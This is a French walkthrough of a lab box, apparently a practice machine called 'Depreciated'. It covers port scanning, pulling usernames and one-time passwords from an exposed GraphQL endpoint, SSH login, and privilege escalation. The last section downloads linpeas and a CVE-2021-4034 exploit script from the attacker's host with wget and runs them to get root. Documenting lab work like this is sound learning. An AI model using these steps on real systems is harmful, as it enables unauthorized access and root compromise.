
# Depreciated

	sudo  masscan  -p1-65535,U:1-65535 192.168.231.170 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.231.170
	ffuf -u http://192.168.231.170/FUZZ -w  /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -e .php,.txt,.ini,.conf,.log -fc 403
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
    80/tcp open http nginx 1.18.0 (Ubuntu)  
    5132/tcp open unknown  
    8433/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)

http://192.168.231.170 => "For sometime web UI will stay down, please use the CLI application on port 5132"

Mais dans le code source il y a une portion de code commentée, dont une ligne très intéressante : 

  > \<!--\<form method="post" action="http<span>://127.0.0.1:8433/graphql?query={login(username:$uname, password:$pswd)}" enctype="multipart/form-data"\>--\>

Vérification du port 5132 : 

    nc 192.168.231.170 5132 

Il n'y a qu'un simple prompt demandant un nom d'utilisateur et un OTP.

J'ai essayé d'envoyer des payloads GrapQL basiques depuis mon shell mais sans succès : 

    curl  'http://192.168.231.170:8433/graphql?query={__schema}'
    curl  'http://192.168.231.170:8433/graphql?query={status}'

En fait il suffisait directement de passer par l'interface web sur un navigateur, en faisant cela on tombe sur un éditeur GraphiQL où l'on peut directement travailler et voir nos résultats. Et en jouant avec l'autocomplétion on peut voir quelques fonctions comme "listUsers" et "getOTP" qui semblent très intéressantes.

    {
    	listUsers
    }
    
   On obtient : 

    {
      "data": {
        "listUsers": "['peter', 'jason']"
      }
    }

Plus qu'à tenter d'obtenir les OTP avec la deuxième fonction : 

    {
       getOTP(username:"peter")
    }

On obtient : 

    {
      "data": {
        "getOTP": "Your One Time Password is: CG5pzyISVOMvErUz"
      }
    }
  
  On peut avoir le OTP de Jason de la même manière.

En retournant sur le port 5132 mais cette fois avec les identifiants de Peter, on tombe sur un prompt avec quelques fonctions de gestion de messages.

    nc 192.168.231.170 5132
    $ help
    $ list
    $ read 2345
    ...

Tous les messages sont bloqués sauf le #234 qui indique indirectement le mot de passe de Peter.

    ssh -l peter 192.168.231.170
    cat local.txt

### Élévation de privilèges classique avec un CVE :  

    wget http://192.168.45.239/linpeas.sh
    chmod u+x linpeas.sh
    ./linpeas.sh | tee resultat.txt
    less -R resultat.txt
    
    wget http://192.168.45.239/CVE-2021-4034.sh
    chmod u+x CVE-2021-4034.sh
    ./CVE-2021-4034.sh
    ls /root
    cat /root/proof.txt
